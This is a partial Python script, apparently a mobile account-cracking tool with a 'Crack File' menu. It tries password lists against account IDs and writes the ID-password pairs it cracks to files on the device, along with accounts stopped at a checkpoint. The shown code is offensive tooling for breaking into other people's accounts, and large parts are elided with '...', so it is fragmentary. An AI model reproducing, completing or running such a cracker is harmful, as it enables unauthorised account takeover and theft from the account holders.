...
def ikb():
    ...
    os.system('clear')
    print(logo)
    print('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] STATUS   :\x1b[1;92mFREE\x1b[1;97m');time.sleep(0.03)
    print('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] VERSION  :\x1b[1;92mikx1.2\x1b[1;97m  ')         
    print(47*'-')
    print('[01] Crack File')
    print('[02] My Youtube')
    print(47*'-')
    
    _ikb___ = input('\x1b[1;92m[<\>\x1b[1;92m] CHOOSE OPTION : ')
    if _ikb___ in ('1', '01'):
        file()
    if _ikb___ in ('2', '02'):
    	mysocial()
...
def api(ids,names,passlist):
    ...
    'accept-language': 'en-US,en;q=0.9',}
                        ...
                        if "c_user" in IK:
                                ...
                                open('/sdcard/IKx-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in IK:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/IKx-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
